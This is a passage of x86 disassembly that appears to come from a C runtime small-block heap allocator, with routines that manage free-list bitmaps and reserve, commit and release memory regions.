  4268f4:	mov    DWORD PTR [ecx+0x4],esi
  4268f7:	mov    ecx,DWORD PTR [esi+0x4]
  4268fa:	mov    DWORD PTR [ecx+0x8],esi
  4268fd:	mov    ecx,DWORD PTR [esi+0x4]
  426900:	cmp    ecx,DWORD PTR [esi+0x8]
  426903:	jne    0x426965
  426905:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426909:	mov    BYTE PTR [ebp+0xf],cl
  42690c:	inc    cl
  42690e:	cmp    edx,0x20
  426911:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426915:	jae    0x42693c
  426917:	cmp    BYTE PTR [ebp+0xf],0x0
  42691b:	jne    0x42692b
  42691d:	mov    ecx,edx
  42691f:	mov    ebx,0x80000000
  426924:	shr    ebx,cl
  426926:	mov    ecx,DWORD PTR [ebp+0x8]
  426929:	or     DWORD PTR [ecx],ebx
  42692b:	mov    ebx,0x80000000
  426930:	mov    ecx,edx
  426932:	shr    ebx,cl
  426934:	lea    eax,[eax+edi*4+0x44]
  426938:	or     DWORD PTR [eax],ebx
  42693a:	jmp    0x426965
  42693c:	cmp    BYTE PTR [ebp+0xf],0x0
  426940:	jne    0x426952
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    ebx,0x80000000
  42694a:	shr    ebx,cl
  42694c:	mov    ecx,DWORD PTR [ebp+0x8]
  42694f:	or     DWORD PTR [ecx+0x4],ebx
  426952:	lea    ecx,[edx-0x20]
  426955:	mov    edx,0x80000000
  42695a:	shr    edx,cl
  42695c:	lea    eax,[eax+edi*4+0xc4]
  426963:	or     DWORD PTR [eax],edx
  426965:	mov    eax,DWORD PTR [ebp-0x4]
  426968:	mov    DWORD PTR [esi],eax
  42696a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42696e:	mov    eax,DWORD PTR [ebp-0x10]
  426971:	dec    DWORD PTR [eax]
  426973:	jne    0x426a70
  426979:	mov    eax,ds:0x45def8
  42697e:	test   eax,eax
  426980:	je     0x426a62
  426986:	mov    ecx,DWORD PTR ds:0x45df10
  42698c:	mov    esi,DWORD PTR ds:0x4290b0
  426992:	push   0x4000
  426997:	shl    ecx,0xf
  42699a:	add    ecx,DWORD PTR [eax+0xc]
  42699d:	mov    ebx,0x8000
  4269a2:	push   ebx
  4269a3:	push   ecx
  4269a4:	call   esi
  4269a6:	mov    ecx,DWORD PTR ds:0x45df10
  4269ac:	mov    eax,ds:0x45def8
  4269b1:	mov    edx,0x80000000
  4269b6:	shr    edx,cl
  4269b8:	or     DWORD PTR [eax+0x8],edx
  4269bb:	mov    eax,ds:0x45def8
  4269c0:	mov    eax,DWORD PTR [eax+0x10]
  4269c3:	mov    ecx,DWORD PTR ds:0x45df10
  4269c9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269d1:	mov    eax,ds:0x45def8
  4269d6:	mov    eax,DWORD PTR [eax+0x10]
  4269d9:	dec    BYTE PTR [eax+0x43]
  4269dc:	mov    eax,ds:0x45def8
  4269e1:	mov    ecx,DWORD PTR [eax+0x10]
  4269e4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269e8:	jne    0x4269f3
  4269ea:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269ee:	mov    eax,ds:0x45def8
  4269f3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269f7:	jne    0x426a62
  4269f9:	push   ebx
  4269fa:	push   0x0
  4269fc:	push   DWORD PTR [eax+0xc]
  4269ff:	call   esi
  426a01:	mov    eax,ds:0x45def8
  426a06:	push   DWORD PTR [eax+0x10]
  426a09:	push   0x0
  426a0b:	push   DWORD PTR ds:0x45e140
  426a11:	call   DWORD PTR ds:0x429048
  426a17:	mov    eax,ds:0x45defc
  426a1c:	mov    edx,DWORD PTR ds:0x45df00
  426a22:	lea    eax,[eax+eax*4]
  426a25:	shl    eax,0x2
  426a28:	mov    ecx,eax
  426a2a:	mov    eax,ds:0x45def8
  426a2f:	sub    ecx,eax
  426a31:	lea    ecx,[ecx+edx*1-0x14]
  426a35:	push   ecx
  426a36:	lea    ecx,[eax+0x14]
  426a39:	push   ecx
  426a3a:	push   eax
  426a3b:	call   0x428290
  426a40:	mov    eax,DWORD PTR [ebp+0x8]
  426a43:	add    esp,0xc
  426a46:	dec    DWORD PTR ds:0x45defc
  426a4c:	cmp    eax,DWORD PTR ds:0x45def8
  426a52:	jbe    0x426a58
  426a54:	sub    DWORD PTR [ebp+0x8],0x14
  426a58:	mov    eax,ds:0x45df00
  426a5d:	mov    ds:0x45df08,eax
  426a62:	mov    eax,DWORD PTR [ebp+0x8]
  426a65:	mov    ds:0x45def8,eax
  426a6a:	mov    DWORD PTR ds:0x45df10,edi
  426a70:	pop    ebx
  426a71:	pop    edi
  426a72:	pop    esi
  426a73:	leave  
  426a74:	ret    
  426a75:	mov    eax,ds:0x45defc
  426a7a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a80:	push   edi
  426a81:	xor    edi,edi
  426a83:	cmp    eax,ecx
  426a85:	jne    0x426abb
  426a87:	lea    eax,[ecx+ecx*4+0x50]
  426a8b:	shl    eax,0x2
  426a8e:	push   eax
  426a8f:	push   DWORD PTR ds:0x45df00
  426a95:	push   edi
  426a96:	push   DWORD PTR ds:0x45e140
  426a9c:	call   DWORD PTR ds:0x4290d4
  426aa2:	cmp    eax,edi
  426aa4:	jne    0x426aaa
  426aa6:	xor    eax,eax
  426aa8:	pop    edi
  426aa9:	ret    
  426aaa:	add    DWORD PTR ds:0x45df0c,0x10
  426ab1:	mov    ds:0x45df00,eax
  426ab6:	mov    eax,ds:0x45defc
  426abb:	mov    ecx,DWORD PTR ds:0x45df00
  426ac1:	push   esi
  426ac2:	push   0x41c4
  426ac7:	push   0x8
  426ac9:	push   DWORD PTR ds:0x45e140
  426acf:	lea    eax,[eax+eax*4]
  426ad2:	lea    esi,[ecx+eax*4]
  426ad5:	call   DWORD PTR ds:0x429030
  426adb:	cmp    eax,edi
  426add:	mov    DWORD PTR [esi+0x10],eax
  426ae0:	jne    0x426ae6
  426ae2:	xor    eax,eax
  426ae4:	jmp    0x426b29
  426ae6:	push   0x4
  426ae8:	push   0x2000
  426aed:	push   0x100000
  426af2:	push   edi
  426af3:	call   DWORD PTR ds:0x4290d0
  426af9:	cmp    eax,edi
  426afb:	mov    DWORD PTR [esi+0xc],eax
  426afe:	jne    0x426b12
  426b00:	push   DWORD PTR [esi+0x10]
  426b03:	push   edi
  426b04:	push   DWORD PTR ds:0x45e140
  426b0a:	call   DWORD PTR ds:0x429048
  426b10:	jmp    0x426ae2
  426b12:	or     DWORD PTR [esi+0x8],0xffffffff
  426b16:	mov    DWORD PTR [esi],edi
  426b18:	mov    DWORD PTR [esi+0x4],edi
  426b1b:	inc    DWORD PTR ds:0x45defc
  426b21:	mov    eax,DWORD PTR [esi+0x10]
  426b24:	or     DWORD PTR [eax],0xffffffff
  426b27:	mov    eax,esi
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	ret    
  426b2c:	push   ebp
  426b2d:	mov    ebp,esp
  426b2f:	push   ecx
  426b30:	push   ecx
  426b31:	mov    ecx,DWORD PTR [ebp+0x8]
  426b34:	mov    eax,DWORD PTR [ecx+0x8]
  426b37:	push   ebx
  426b38:	push   esi
  426b39:	mov    esi,DWORD PTR [ecx+0x10]
  426b3c:	push   edi
  426b3d:	xor    ebx,ebx
  426b3f:	jmp    0x426b44
  426b41:	shl    eax,1
  426b43:	inc    ebx
  426b44:	test   eax,eax
  426b46:	jge    0x426b41
  426b48:	mov    eax,ebx
  426b4a:	imul   eax,eax,0x204
  426b50:	lea    eax,[eax+esi*1+0x144]
  426b57:	push   0x3f
  426b59:	mov    DWORD PTR [ebp-0x8],eax
  426b5c:	pop    edx
  426b5d:	mov    DWORD PTR [eax+0x8],eax
  426b60:	mov    DWORD PTR [eax+0x4],eax
  426b63:	add    eax,0x8
  426b66:	dec    edx
  426b67:	jne    0x426b5d
  426b69:	push   0x4
  426b6b:	mov    edi,ebx
  426b6d:	push   0x1000
  426b72:	shl    edi,0xf
  426b75:	add    edi,DWORD PTR [ecx+0xc]
  426b78:	push   0x8000
  426b7d:	push   edi
  426b7e:	call   DWORD PTR ds:0x4290d0
  426b84:	test   eax,eax
  426b86:	jne    0x426b90
  426b88:	or     eax,0xffffffff
  426b8b:	jmp    0x426c2d
  426b90:	lea    edx,[edi+0x7000]
  426b96:	cmp    edi,edx
  426b98:	mov    DWORD PTR [ebp-0x4],edx
  426b9b:	ja     0x426be0
  426b9d:	mov    ecx,edx
  426b9f:	sub    ecx,edi
  426ba1:	shr    ecx,0xc
  426ba4:	lea    eax,[edi+0x10]
  426ba7:	inc    ecx
  426ba8:	or     DWORD PTR [eax-0x8],0xffffffff
  426bac:	or     DWORD PTR [eax+0xfec],0xffffffff
  426bb3:	lea    edx,[eax+0xffc]
  426bb9:	mov    DWORD PTR [eax],edx
  426bbb:	lea    edx,[eax-0x1004]
  426bc1:	mov    DWORD PTR [eax-0x4],0xff0
  426bc8:	mov    DWORD PTR [eax+0x4],edx
  426bcb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bd5:	add    eax,0x1000
  426bda:	dec    ecx
  426bdb:	jne    0x426ba8
  426bdd:	mov    edx,DWORD PTR [ebp-0x4]
  426be0:	mov    eax,DWORD PTR [ebp-0x8]
  426be3:	add    eax,0x1f8
  426be8:	lea    ecx,[edi+0xc]
  426beb:	mov    DWORD PTR [eax+0x4],ecx
  426bee:	mov    DWORD PTR [ecx+0x8],eax
  426bf1:	lea    ecx,[edx+0xc]
  426bf4:	mov    DWORD PTR [eax+0x8],ecx
  426bf7:	mov    DWORD PTR [ecx+0x4],eax
  426bfa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bff:	xor    edi,edi
  426c01:	inc    edi
  426c02:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426c09:	mov    al,BYTE PTR [esi+0x43]
  426c0c:	mov    cl,al
  426c0e:	inc    cl
  426c10:	test   al,al
  426c12:	mov    eax,DWORD PTR [ebp+0x8]
  426c15:	mov    BYTE PTR [esi+0x43],cl
  426c18:	jne    0x426c1d
  426c1a:	or     DWORD PTR [eax+0x4],edi
  426c1d:	mov    edx,0x80000000
  426c22:	mov    ecx,ebx
  426c24:	shr    edx,cl
  426c26:	not    edx
  426c28:	and    DWORD PTR [eax+0x8],edx
  426c2b:	mov    eax,ebx
  426c2d:	pop    edi
  426c2e:	pop    esi
  426c2f:	pop    ebx
  426c30:	leave  
  426c31:	ret    
  426c32:	push   ebp
  426c33:	mov    ebp,esp
  426c35:	sub    esp,0xc
  426c38:	mov    ecx,DWORD PTR [ebp+0x8]
  426c3b:	mov    eax,DWORD PTR [ecx+0x10]
  426c3e:	push   ebx
  426c3f:	push   esi
  426c40:	mov    esi,DWORD PTR [ebp+0x10]
  426c43:	push   edi
  426c44:	mov    edi,DWORD PTR [ebp+0xc]
  426c47:	mov    edx,edi
  426c49:	sub    edx,DWORD PTR [ecx+0xc]
  426c4c:	add    esi,0x17
  426c4f:	shr    edx,0xf
  426c52:	mov    ecx,edx
  426c54:	imul   ecx,ecx,0x204
  426c5a:	lea    ecx,[ecx+eax*1+0x144]
  426c61:	mov    DWORD PTR [ebp-0xc],ecx
  426c64:	mov    ecx,DWORD PTR [edi-0x4]
  426c67:	and    esi,0xfffffff0
  426c6a:	dec    ecx
  426c6b:	cmp    esi,ecx
  426c6d:	lea    edi,[ecx+edi*1-0x4]
  426c71:	mov    ebx,DWORD PTR [edi]
  426c73:	mov    DWORD PTR [ebp+0x10],ecx
  426c76:	mov    DWORD PTR [ebp-0x4],ebx
  426c79:	jle    0x426dd4
  426c7f:	test   bl,0x1
  426c82:	jne    0x426dcd
  426c88:	add    ebx,ecx
  426c8a:	cmp    esi,ebx
  426c8c:	jg     0x426dcd
  426c92:	mov    ecx,DWORD PTR [ebp-0x4]
  426c95:	sar    ecx,0x4
  426c98:	dec    ecx
  426c99:	cmp    ecx,0x3f
  426c9c:	mov    DWORD PTR [ebp-0x8],ecx
  426c9f:	jbe    0x426ca7
  426ca1:	push   0x3f
  426ca3:	pop    ecx
  426ca4:	mov    DWORD PTR [ebp-0x8],ecx
  426ca7:	mov    ebx,DWORD PTR [edi+0x4]
  426caa:	cmp    ebx,DWORD PTR [edi+0x8]
  426cad:	jne    0x426cf2
  426caf:	cmp    ecx,0x20
  426cb2:	mov    ebx,0x80000000
  426cb7:	jae    0x426cd3
  426cb9:	shr    ebx,cl
  426cbb:	mov    ecx,DWORD PTR [ebp-0x8]
  426cbe:	lea    ecx,[ecx+eax*1+0x4]
  426cc2:	not    ebx
  426cc4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cc8:	dec    BYTE PTR [ecx]
  426cca:	jne    0x426cf2
  426ccc:	mov    ecx,DWORD PTR [ebp+0x8]
  426ccf:	and    DWORD PTR [ecx],ebx
  426cd1:	jmp    0x426cf2
  426cd3:	add    ecx,0xffffffe0
  426cd6:	shr    ebx,cl
  426cd8:	mov    ecx,DWORD PTR [ebp-0x8]
  426cdb:	lea    ecx,[ecx+eax*1+0x4]
  426cdf:	not    ebx
  426ce1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426ce8:	dec    BYTE PTR [ecx]
  426cea:	jne    0x426cf2
  426cec:	mov    ecx,DWORD PTR [ebp+0x8]
  426cef:	and    DWORD PTR [ecx+0x4],ebx
  426cf2:	mov    ecx,DWORD PTR [edi+0x8]
  426cf5:	mov    ebx,DWORD PTR [edi+0x4]
  426cf8:	mov    DWORD PTR [ecx+0x4],ebx
  426cfb:	mov    ecx,DWORD PTR [edi+0x4]
  426cfe:	mov    edi,DWORD PTR [edi+0x8]
  426d01:	mov    DWORD PTR [ecx+0x8],edi
  426d04:	mov    ecx,DWORD PTR [ebp+0x10]
  426d07:	sub    ecx,esi
  426d09:	add    DWORD PTR [ebp-0x4],ecx
  426d0c:	cmp    DWORD PTR [ebp-0x4],0x0
  426d10:	jle    0x426dbb
  426d16:	mov    edi,DWORD PTR [ebp-0x4]
  426d19:	mov    ecx,DWORD PTR [ebp+0xc]
  426d1c:	sar    edi,0x4
  426d1f:	dec    edi
  426d20:	cmp    edi,0x3f
  426d23:	lea    ecx,[ecx+esi*1-0x4]
  426d27:	jbe    0x426d2c
  426d29:	push   0x3f
  426d2b:	pop    edi
  426d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d2f:	lea    ebx,[ebx+edi*8]
  426d32:	mov    DWORD PTR [ebp+0x10],ebx
  426d35:	mov    ebx,DWORD PTR [ebx+0x4]
  426d38:	mov    DWORD PTR [ecx+0x4],ebx
  426d3b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d3e:	mov    DWORD PTR [ecx+0x8],ebx
  426d41:	mov    DWORD PTR [ebx+0x4],ecx
  426d44:	mov    ebx,DWORD PTR [ecx+0x4]
  426d47:	mov    DWORD PTR [ebx+0x8],ecx
  426d4a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d4d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d50:	jne    0x426da9
  426d52:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d56:	mov    BYTE PTR [ebp+0x13],cl
  426d59:	inc    cl
  426d5b:	cmp    edi,0x20
  426d5e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d62:	jae    0x426d80
  426d64:	cmp    BYTE PTR [ebp+0x13],0x0
  426d68:	jne    0x426d78
  426d6a:	mov    ecx,edi
  426d6c:	mov    ebx,0x80000000
  426d71:	shr    ebx,cl
  426d73:	mov    ecx,DWORD PTR [ebp+0x8]
  426d76:	or     DWORD PTR [ecx],ebx
  426d78:	lea    eax,[eax+edx*4+0x44]
  426d7c:	mov    ecx,edi
  426d7e:	jmp    0x426da0
  426d80:	cmp    BYTE PTR [ebp+0x13],0x0
  426d84:	jne    0x426d96
  426d86:	lea    ecx,[edi-0x20]
  426d89:	mov    ebx,0x80000000
  426d8e:	shr    ebx,cl
  426d90:	mov    ecx,DWORD PTR [ebp+0x8]
  426d93:	or     DWORD PTR [ecx+0x4],ebx
  426d96:	lea    eax,[eax+edx*4+0xc4]
  426d9d:	lea    ecx,[edi-0x20]
  426da0:	mov    edx,0x80000000
  426da5:	shr    edx,cl
  426da7:	or     DWORD PTR [eax],edx
  426da9:	mov    edx,DWORD PTR [ebp+0xc]
  426dac:	mov    ecx,DWORD PTR [ebp-0x4]
  426daf:	lea    eax,[edx+esi*1-0x4]
  426db3:	mov    DWORD PTR [eax],ecx
  426db5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426db9:	jmp    0x426dbe
  426dbb:	mov    edx,DWORD PTR [ebp+0xc]
  426dbe:	lea    eax,[esi+0x1]
  426dc1:	mov    DWORD PTR [edx-0x4],eax
  426dc4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426dc8:	jmp    0x426f09
  426dcd:	xor    eax,eax
  426dcf:	jmp    0x426f0c
  426dd4:	jge    0x426f09
  426dda:	mov    ebx,DWORD PTR [ebp+0xc]
  426ddd:	sub    DWORD PTR [ebp+0x10],esi
  426de0:	lea    ecx,[esi+0x1]
  426de3:	mov    DWORD PTR [ebx-0x4],ecx
  426de6:	lea    ebx,[ebx+esi*1-0x4]
  426dea:	mov    esi,DWORD PTR [ebp+0x10]
  426ded:	sar    esi,0x4
  426df0:	dec    esi
  426df1:	cmp    esi,0x3f
  426df4:	mov    DWORD PTR [ebp+0xc],ebx
  426df7:	mov    DWORD PTR [ebx-0x4],ecx
  426dfa:	jbe    0x426dff
  426dfc:	push   0x3f
  426dfe:	pop    esi
  426dff:	test   BYTE PTR [ebp-0x4],0x1
  426e03:	jne    0x426e89
  426e09:	mov    esi,DWORD PTR [ebp-0x4]
  426e0c:	sar    esi,0x4
  426e0f:	dec    esi
  426e10:	cmp    esi,0x3f
  426e13:	jbe    0x426e18
  426e15:	push   0x3f
  426e17:	pop    esi
  426e18:	mov    ecx,DWORD PTR [edi+0x4]
  426e1b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e1e:	jne    0x426e62
  426e20:	cmp    esi,0x20
  426e23:	mov    ebx,0x80000000
  426e28:	jae    0x426e43
  426e2a:	mov    ecx,esi
  426e2c:	shr    ebx,cl
  426e2e:	lea    esi,[esi+eax*1+0x4]
  426e32:	not    ebx
  426e34:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e38:	dec    BYTE PTR [esi]
  426e3a:	jne    0x426e5f
  426e3c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e3f:	and    DWORD PTR [ecx],ebx
  426e41:	jmp    0x426e5f
  426e43:	lea    ecx,[esi-0x20]
  426e46:	shr    ebx,cl
  426e48:	lea    ecx,[esi+eax*1+0x4]
  426e4c:	not    ebx
  426e4e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e55:	dec    BYTE PTR [ecx]
  426e57:	jne    0x426e5f
  426e59:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5c:	and    DWORD PTR [ecx+0x4],ebx
  426e5f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e62:	mov    ecx,DWORD PTR [edi+0x8]
  426e65:	mov    esi,DWORD PTR [edi+0x4]
  426e68:	mov    DWORD PTR [ecx+0x4],esi
  426e6b:	mov    esi,DWORD PTR [edi+0x8]
  426e6e:	mov    ecx,DWORD PTR [edi+0x4]
  426e71:	mov    DWORD PTR [ecx+0x8],esi
  426e74:	mov    esi,DWORD PTR [ebp+0x10]
  426e77:	add    esi,DWORD PTR [ebp-0x4]
  426e7a:	mov    DWORD PTR [ebp+0x10],esi
  426e7d:	sar    esi,0x4
  426e80:	dec    esi
  426e81:	cmp    esi,0x3f
  426e84:	jbe    0x426e89
  426e86:	push   0x3f
  426e88:	pop    esi
  426e89:	mov    ecx,DWORD PTR [ebp-0xc]
  426e8c:	lea    ecx,[ecx+esi*8]
  426e8f:	mov    edi,DWORD PTR [ecx+0x4]
  426e92:	mov    DWORD PTR [ebx+0x8],ecx
  426e95:	mov    DWORD PTR [ebx+0x4],edi
  426e98:	mov    DWORD PTR [ecx+0x4],ebx
  426e9b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e9e:	mov    DWORD PTR [ecx+0x8],ebx
  426ea1:	mov    ecx,DWORD PTR [ebx+0x4]
  426ea4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426ea7:	jne    0x426f00
  426ea9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ead:	mov    BYTE PTR [ebp+0xf],cl
  426eb0:	inc    cl
  426eb2:	cmp    esi,0x20
  426eb5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426eb9:	jae    0x426ed7
  426ebb:	cmp    BYTE PTR [ebp+0xf],0x0
  426ebf:	jne    0x426ecf
  426ec1:	mov    ecx,esi
  426ec3:	mov    edi,0x80000000
  426ec8:	shr    edi,cl
  426eca:	mov    ecx,DWORD PTR [ebp+0x8]
  426ecd:	or     DWORD PTR [ecx],edi
  426ecf:	lea    eax,[eax+edx*4+0x44]
  426ed3:	mov    ecx,esi
  426ed5:	jmp    0x426ef7
  426ed7:	cmp    BYTE PTR [ebp+0xf],0x0
  426edb:	jne    0x426eed
  426edd:	lea    ecx,[esi-0x20]
  426ee0:	mov    edi,0x80000000
  426ee5:	shr    edi,cl
  426ee7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eea:	or     DWORD PTR [ecx+0x4],edi
  426eed:	lea    eax,[eax+edx*4+0xc4]
  426ef4:	lea    ecx,[esi-0x20]
  426ef7:	mov    edx,0x80000000
  426efc:	shr    edx,cl
  426efe:	or     DWORD PTR [eax],edx
  426f00:	mov    eax,DWORD PTR [ebp+0x10]
  426f03:	mov    DWORD PTR [ebx],eax
  426f05:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426f09:	xor    eax,eax
  426f0b:	inc    eax
  426f0c:	pop    edi
  426f0d:	pop    esi
  426f0e:	pop    ebx
  426f0f:	leave  
  426f10:	ret    
  426f11:	push   ebp
  426f12:	mov    ebp,esp
  426f14:	sub    esp,0x14
  426f17:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1a:	mov    eax,ds:0x45defc
  426f1f:	mov    edx,DWORD PTR ds:0x45df00
  426f25:	add    ecx,0x17
  426f28:	and    ecx,0xfffffff0
  426f2b:	push   ebx
  426f2c:	mov    DWORD PTR [ebp-0x10],ecx
  426f2f:	sar    ecx,0x4
  426f32:	push   esi
  426f33:	lea    eax,[eax+eax*4]
  426f36:	push   edi
  426f37:	dec    ecx
  426f38:	cmp    ecx,0x20
  426f3b:	lea    edi,[edx+eax*4]
  426f3e:	mov    DWORD PTR [ebp-0x4],edi
  426f41:	jge    0x426f4e
  426f43:	or     esi,0xffffffff
  426f46:	shr    esi,cl
  426f48:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f4c:	jmp    0x426f5b
  426f4e:	add    ecx,0xffffffe0
  426f51:	or     eax,0xffffffff
  426f54:	xor    esi,esi
  426f56:	shr    eax,cl
  426f58:	mov    DWORD PTR [ebp-0x8],eax
  426f5b:	mov    eax,ds:0x45df08
  426f60:	mov    ebx,eax
  426f62:	mov    DWORD PTR [ebp-0xc],esi
  426f65:	cmp    ebx,edi
  426f67:	jmp    0x426f7d
  426f69:	mov    ecx,DWORD PTR [ebx+0x4]
  426f6c:	mov    edi,DWORD PTR [ebx]
  426f6e:	and    ecx,DWORD PTR [ebp-0x8]
  426f71:	and    edi,esi
  426f73:	or     ecx,edi
  426f75:	jne    0x426f82
  426f77:	add    ebx,0x14
  426f7a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f7d:	mov    DWORD PTR [ebp+0x8],ebx
  426f80:	jb     0x426f69
  426f82:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f85:	jne    0x426fab
  426f87:	mov    ebx,edx
  426f89:	jmp    0x426f9c
  426f8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f8e:	mov    edi,DWORD PTR [ebx]
  426f90:	and    ecx,DWORD PTR [ebp-0x8]
  426f93:	and    edi,esi
  426f95:	or     ecx,edi
  426f97:	jne    0x426fa3
  426f99:	add    ebx,0x14
  426f9c:	cmp    ebx,eax
  426f9e:	mov    DWORD PTR [ebp+0x8],ebx
  426fa1:	jb     0x426f8b
  426fa3:	cmp    ebx,eax
  426fa5:	je     0x42703f
  426fab:	mov    DWORD PTR ds:0x45df08,ebx
  426fb1:	mov    eax,DWORD PTR [ebx+0x10]
  426fb4:	mov    edx,DWORD PTR [eax]
  426fb6:	cmp    edx,0xffffffff
  426fb9:	mov    DWORD PTR [ebp-0x4],edx
  426fbc:	je     0x426fd2
  426fbe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fc5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fc9:	and    ecx,DWORD PTR [ebp-0x8]
  426fcc:	and    edi,esi
  426fce:	or     ecx,edi
  426fd0:	jne    0x427008
  426fd2:	mov    edx,DWORD PTR [eax+0xc4]
  426fd8:	and    edx,DWORD PTR [ebp-0x8]
  426fdb:	and    DWORD PTR [ebp-0x4],0x0
  426fdf:	lea    ecx,[eax+0x44]
  426fe2:	mov    esi,DWORD PTR [ecx]
  426fe4:	and    esi,DWORD PTR [ebp-0xc]
  426fe7:	or     edx,esi
  426fe9:	mov    esi,DWORD PTR [ebp-0xc]
  426fec:	jne    0x427005
  426fee:	mov    edx,DWORD PTR [ecx+0x84]
  426ff4:	and    edx,DWORD PTR [ebp-0x8]
  426ff7:	inc    DWORD PTR [ebp-0x4]
  426ffa:	add    ecx,0x4
  426ffd:	mov    edi,DWORD PTR [ecx]
  426fff:	and    edi,esi
  427001:	or     edx,edi
  427003:	je     0x426fee
  427005:	mov    edx,DWORD PTR [ebp-0x4]
  427008:	mov    ecx,edx
  42700a:	imul   ecx,ecx,0x204
  427010:	lea    ecx,[ecx+eax*1+0x144]
  427017:	mov    DWORD PTR [ebp-0xc],ecx
  42701a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42701e:	xor    edi,edi
  427020:	and    ecx,esi
  427022:	jne    0x427091
  427024:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42702b:	and    ecx,DWORD PTR [ebp-0x8]
  42702e:	push   0x20
  427030:	pop    edi
  427031:	jmp    0x427091
  427033:	cmp    DWORD PTR [ebx+0x8],0x0
  427037:	jne    0x427044
  427039:	add    ebx,0x14
  42703c:	mov    DWORD PTR [ebp+0x8],ebx
  42703f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427042:	jb     0x427033
  427044:	cmp    ebx,DWORD PTR [ebp-0x4]
  427047:	jne    0x42706f
  427049:	mov    ebx,edx
  42704b:	jmp    0x427056
  42704d:	cmp    DWORD PTR [ebx+0x8],0x0
  427051:	jne    0x42705d
  427053:	add    ebx,0x14
  427056:	cmp    ebx,eax
  427058:	mov    DWORD PTR [ebp+0x8],ebx
  42705b:	jb     0x42704d
  42705d:	cmp    ebx,eax
  42705f:	jne    0x42706f
  427061:	call   0x426a75
  427066:	mov    ebx,eax
  427068:	test   ebx,ebx
  42706a:	mov    DWORD PTR [ebp+0x8],ebx
  42706d:	je     0x427087
  42706f:	push   ebx
  427070:	call   0x426b2c
  427075:	pop    ecx
  427076:	mov    ecx,DWORD PTR [ebx+0x10]
  427079:	mov    DWORD PTR [ecx],eax
  42707b:	mov    eax,DWORD PTR [ebx+0x10]
  42707e:	cmp    DWORD PTR [eax],0xffffffff
  427081:	jne    0x426fab
  427087:	xor    eax,eax
  427089:	jmp    0x427208
  42708e:	shl    ecx,1
  427090:	inc    edi
  427091:	test   ecx,ecx
  427093:	jge    0x42708e
  427095:	mov    ecx,DWORD PTR [ebp-0xc]
  427098:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42709c:	mov    ecx,DWORD PTR [edx]
  42709e:	sub    ecx,DWORD PTR [ebp-0x10]
  4270a1:	mov    esi,ecx
  4270a3:	sar    esi,0x4
  4270a6:	dec    esi
  4270a7:	cmp    esi,0x3f
  4270aa:	mov    DWORD PTR [ebp-0x8],ecx
  4270ad:	jle    0x4270b2
  4270af:	push   0x3f
  4270b1:	pop    esi
  4270b2:	cmp    esi,edi
  4270b4:	je     0x4271bb
  4270ba:	mov    ecx,DWORD PTR [edx+0x4]
  4270bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4270c0:	jne    0x42711e
  4270c2:	cmp    edi,0x20
  4270c5:	mov    ebx,0x80000000
  4270ca:	jge    0x4270f2
  4270cc:	mov    ecx,edi
  4270ce:	shr    ebx,cl
  4270d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270d3:	lea    edi,[eax+edi*1+0x4]
  4270d7:	not    ebx
  4270d9:	mov    DWORD PTR [ebp-0x14],ebx
  4270dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270e4:	dec    BYTE PTR [edi]
  4270e6:	jne    0x42711b
  4270e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4270ee:	and    DWORD PTR [ebx],ecx
  4270f0:	jmp    0x42711e
  4270f2:	lea    ecx,[edi-0x20]
  4270f5:	shr    ebx,cl
  4270f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270fa:	lea    ecx,[eax+ecx*4+0xc4]
  427101:	lea    edi,[eax+edi*1+0x4]
  427105:	not    ebx
  427107:	and    DWORD PTR [ecx],ebx
  427109:	dec    BYTE PTR [edi]
  42710b:	mov    DWORD PTR [ebp-0x14],ebx
  42710e:	jne    0x42711b
  427110:	mov    ebx,DWORD PTR [ebp+0x8]
  427113:	mov    ecx,DWORD PTR [ebp-0x14]
